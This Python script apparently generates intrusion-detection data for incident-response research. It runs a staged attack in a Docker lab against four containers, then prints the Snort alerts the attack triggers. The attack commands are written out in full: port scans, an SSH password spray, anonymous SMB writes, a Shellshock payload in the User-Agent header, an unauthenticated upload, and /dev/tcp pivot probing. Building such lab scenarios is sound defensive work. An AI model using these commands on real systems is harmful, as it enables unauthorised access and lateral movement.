"""
Execute a diverse four-server attack scenario in the digital twin.

This scenario runs from the client container (10.0.1.11) and targets only:
- server_ssh at 10.0.2.11
- server_samba at 10.0.2.12
- server_shellshock at 10.0.2.13
- server_web1 at 10.0.2.14

The stages intentionally differ from run_attack.py:
- server_ssh: low-volume password spraying followed by marker creation.
- server_samba: directory creation, file write, and read-back over SMB.
- server_shellshock: CGI command execution that writes and reads a marker file.
- server_web1: HTTP upload into a web-accessible writable directory.
- pivot: real internal pivot from server_shellshock after Shellshock RCE.
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"

SERVER_SSH = "10.0.2.11"
SERVER_SAMBA = "10.0.2.12"
SERVER_SHELLSHOCK = "10.0.2.13"
SERVER_WEB1 = "10.0.2.14"


def run(command: str) -> str:
    """Execute a command in the client container and log the result."""
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def run_in(container: str, command: str) -> str:
    """Execute a command in a specified container and log the result."""
    result = DockerManager.exec_run(container, command)
    logger.info("[container=%s exit=%s] %s", container, result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the four-server attack and print resulting Snort alerts."""
    logger.info("=== Stage 1: Targeted service discovery without ICMP sweep ===")
    run(f"nmap -sT -Pn --host-timeout 10s -p 22 {SERVER_SSH}")
    time.sleep(0.3)
    run(f"nmap -sT -Pn --host-timeout 10s -p 139,445 {SERVER_SAMBA}")
    time.sleep(0.3)
    run(
        "curl -s -o /dev/null "
        "-w 'target=%{remote_ip} path=/cgi-bin/vulnerable "
        f"status=%{{http_code}}\\n' http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable"
    )
    time.sleep(0.3)
    run(f"nmap -sT -Pn --host-timeout 10s -p 80,8080 {SERVER_WEB1}")

    logger.info("=== Stage 2: Low-volume SSH password spray on server_ssh ===")
    run(
        "for p in winter2024 changeme password123; do "
        "echo trying_password=$p; "
        "sshpass -p \"$p\" ssh "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null "
        "-o ConnectTimeout=4 "
        f"admin@{SERVER_SSH} "
        "'whoami; id; hostname; "
        "echo ssh four-server marker from client "
        "> /tmp/observed_ssh_session_4server.txt; "
        "cat /tmp/observed_ssh_session_4server.txt' "
        "2>&1 && break; "
        "done || true"
    )

    logger.info("=== Stage 3: SMB directory write and read-back on server_samba ===")
    run(
        "printf 'samba four-server marker from client\\n' "
        "> /tmp/observed_samba_write_4server.txt"
    )
    run(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'mkdir observed_dir_4server; "
        "cd observed_dir_4server; "
        "put /tmp/observed_samba_write_4server.txt "
        "observed_samba_write_4server.txt; ls' "
        "2>&1 || true"
    )
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'cd observed_dir_4server; "
        "get observed_samba_write_4server.txt "
        "/tmp/samba_readback_4server.txt' "
        "2>&1 || true"
    )
    run("cat /tmp/samba_readback_4server.txt 2>/dev/null || true")

    logger.info("=== Stage 4: Shellshock marker execution on server_shellshock ===")
    run(
        "curl -s "
        f"'http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable' "
        "-H 'User-Agent: () { :;}; echo; "
        "/bin/sh -c \"whoami; id; hostname; "
        "echo shellshock four-server marker from client "
        "> /tmp/observed_shellshock_4server.txt; "
        "cat /tmp/observed_shellshock_4server.txt\"' "
        "2>&1 || true"
    )

    logger.info("=== Stage 5: Web upload/write on server_web1 ===")
    run(
        "printf 'web1 four-server upload marker from client\\n' "
        "> /tmp/observed_web1_4server_upload.txt"
    )
    run(
        "curl -s -o /tmp/web1_4server_upload_response.txt "
        "-w 'upload_status=%{http_code}\\n' "
        "--data-binary @/tmp/observed_web1_4server_upload.txt "
        f"'http://{SERVER_WEB1}:8080/upload?name=observed_web1_4server_upload.txt'"
    )
    run("cat /tmp/web1_4server_upload_response.txt 2>/dev/null || true")
    run(
        "curl -s -w '\\nfetch_status=%{http_code}\\n' "
        f"http://{SERVER_WEB1}/uploads/observed_web1_4server_upload.txt"
    )

    logger.info("=== Stage 6: Real pivot from server_shellshock ===")
    run_in(
        "server_shellshock",
        "bash -lc '"
        "echo pivot_host=$(hostname); "
        "echo pivot_source=10.0.2.13; "
        "echo shellshock_marker=$(cat "
        "/tmp/observed_shellshock_4server.txt 2>/dev/null || true); "
        "for spec in 10.0.2.11:22 10.0.2.12:445 10.0.2.14:80 10.0.2.14:8080; do "
        "host=${spec%:*}; port=${spec#*:}; "
        "echo pivot_probe=${host}:${port}; "
        "timeout 2 bash -c \"</dev/tcp/${host}/${port}\" "
        "&& echo open=${host}:${port} || echo closed=${host}:${port}; "
        "done'"
    )

    logger.info("=== Four-server attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
